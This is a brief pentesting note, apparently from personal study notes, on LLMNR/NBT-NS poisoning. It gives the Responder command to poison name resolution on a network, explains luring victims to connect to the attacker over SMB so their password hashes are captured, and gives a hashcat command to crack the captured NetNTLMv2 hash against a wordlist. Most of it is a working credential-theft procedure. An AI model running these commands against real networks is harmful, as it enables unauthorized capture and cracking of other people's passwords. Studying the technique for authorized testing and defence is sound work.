# LLMNR/NBT-NS poisoning overview
Link Local Multicast Name Resolution
NetBios Name Resolution
Used to identify hosts when dns fails, both services use username and password hashes which can be captured via MTM attacks
![[LLMNR_poison.png]]

#### responder.py
assuming we are on the network we can run responder and begin the poisoning process
`python Responder.py -I enp0s31f6 -rdw `

You can now point machines to yourself (via an smb connect, something like `//IP/` in file explorer window). This will result in the has being sent to use through responder.

![[responder_hash.png]]

We can now crack this hash via hashcat
`hashcat -m 5600 hash /home/dials/tools/words/rockyou.txt `
![[cracked_hash.png]]